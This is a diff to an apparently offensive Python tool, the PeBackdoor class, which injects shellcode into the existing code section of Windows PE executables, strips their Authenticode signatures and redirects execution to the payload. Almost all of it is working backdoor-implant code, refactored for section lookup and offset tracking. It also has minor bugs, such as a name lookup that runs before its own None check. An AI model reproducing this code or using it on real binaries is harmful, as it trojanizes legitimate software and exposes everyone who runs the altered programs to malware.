@@ -387,6 +387,10 @@ class PeBackdoor:
         self.logger = logger
         self.createdTlsSection = False
 
+        self.shellcodeOffset = 0     # from start of the file
+        self.shellcodeOffsetRel = 0  # from start of the code section
+        self.backdoorOffsetRel = 0   # from start of the code section
+
     def openFile(self):
         self.pe = pefile.PE(self.infile, fast_load=False)
         self.pe.parse_data_directories()
@@ -412,7 +416,6 @@ class PeBackdoor:
         self.infile = infile
         self.outfile = outfile
         self.sectionName = options.get('section_name', DefaultSectionName)
-        self.shellcodeOffset = 0
 
         try:
             PeBackdoor.SupportedSaveModes(saveMode)
@@ -475,6 +478,15 @@ class PeBackdoor:
         self.logger.ok('PE executable Authenticode signature removed.')
         return True
     
+
+    def _get_code_section(self):
+        entrypoint = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
+        for sect in self.pe.sections:
+            if sect.Characteristics & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']:
+                if entrypoint >= sect.VirtualAddress and entrypoint <= sect.VirtualAddress + sect.SizeOfRawData:
+                    return sect
+        return None
+    
     def injectShellcode(self):
         if self.saveMode == int(PeBackdoor.SupportedSaveModes.NewPESection):
             self.pe.write(self.outfile)
@@ -495,61 +507,45 @@ class PeBackdoor:
 
         elif self.saveMode == int(PeBackdoor.SupportedSaveModes.WithinCodeSection):
             entrypoint = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
-            section = None
+            sect = self._get_code_section()
+            sect_name = sect.Name.decode().rstrip('\x00')
+            sect_size = sect.Misc_VirtualSize  # Better than: SizeOfRawData
+            if sect == None:
+                return False
+            
+            self.logger.dbg(f'Backdooring {sect_name} section.')
 
-            for sect in self.pe.sections:
-                name = sect.Name.decode()
-                self.logger.dbg("Checking if section is executable: {}: 0x{:x}".format(name, sect.Characteristics))
-
-                # 0x20 = code
-                # 0x20000000 = executable
-                if sect.Characteristics & 0x20000000 != 0:
-                #if sect.Characteristics & 0x20 != 0:
-                    # make sure its really the destination section
-                    #   UPX packed files have UPX0, UPX1, where the latter has the entry point
-                    #self.logger.dbg("--> 0x{:x} 0x{:x} 0x{:x}".format(
-                    #    entrypoint,
-                    #    sect.VirtualAddress,
-                    #    sect.VirtualAddress + sect.SizeOfRawData,
-                    #))
-                    if entrypoint > sect.VirtualAddress and entrypoint < sect.VirtualAddress + sect.SizeOfRawData:
-                        section = sect
-                        break
-
-            if section != None:
-                self.logger.dbg(f'Backdooring {name} section.')
-
-                if sect.Misc_VirtualSize < len(self.shellcodeData):
-                    self.logger.fatal(f'''Input shellcode is too large to fit into target PE executable code section!
+            if sect_size < len(self.shellcodeData):
+                self.logger.fatal(f'''Input shellcode is too large to fit into target PE executable code section!
 Shellcode size    : {len(self.shellcodeData)}
-Code section size : {sect.Misc_VirtualSize}
+Code section size : {sect_size}
 ''')
 
-                offset = int((sect.Misc_VirtualSize - len(self.shellcodeData)) / 2)
-                self.logger.dbg(f'Inserting shellcode into 0x{offset:x} offset.')
+            offset = int((sect_size - len(self.shellcodeData)) / 2)
+            self.logger.dbg(f'Inserting shellcode into 0x{offset:x} offset.')
 
-                self.pe.set_bytes_at_offset(offset, self.shellcodeData)
-                self.shellcodeOffset = offset
-        
-                rva = self.pe.get_rva_from_offset(offset)
+            self.pe.set_bytes_at_offset(offset, self.shellcodeData)
+            self.shellcodeOffset = offset
+            self.shellcodeOffsetRel = offset - sect.PointerToRawData
+    
+            rva = self.pe.get_rva_from_offset(offset)
 
-                p = sect.PointerToRawData + sect.SizeOfRawData - 64
-                graph = textwrap.indent(f'''
-Beginning of {name}:
+            p = sect.PointerToRawData + sect.SizeOfRawData - 64
+            graph = textwrap.indent(f'''
+Beginning of {sect_name}:
 {textwrap.indent(hexdump(self.pe.get_data(sect.VirtualAddress), sect.VirtualAddress, 64), "0")}
 
-Injected shellcode in the middle of {name}:
+Injected shellcode in the middle of {sect_name}:
 {hexdump(self.shellcodeData, offset, 64)}
 
-Trailing {name} bytes:
+Trailing {sect_name} bytes:
 {hexdump(self.pe.get_data(self.pe.get_rva_from_offset(p)), p, 64)}
 ''', '\t')
 
-                self.logger.ok(f'Shellcode injected into existing code section at RVA 0x{rva:x}')
-                self.logger.dbg(graph)
-                return True
+            self.logger.ok(f'Shellcode injected into existing code section at RVA 0x{rva:x}')
+            self.logger.dbg(graph)
+            return True
 
-        return False
 
     def setupShellcodeEntryPoint(self):
         if self.runMode == int(PeBackdoor.SupportedRunModes.ModifyOEP):
@@ -650,7 +646,6 @@ Sources:
             ep = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
 
         ep_ava = ep + self.pe.OPTIONAL_HEADER.ImageBase
-
         data = self.pe.get_memory_mapped_image()[ep:ep+128]
         offset = 0
 
@@ -658,6 +653,10 @@ Sources:
 
         disasmData = self.pe.get_memory_mapped_image()
         output = self.disasmBytes(cs, ks, disasmData, ep, 128, self.backdoorInstruction)
+
+        # store offset... by calculating it first FUCK
+        section = self._get_code_section()
+        self.backdoorOffsetRel = output - section.VirtualAddress
 
         if output != 0:
             self.logger.dbg('Now disasm looks like follows: ')
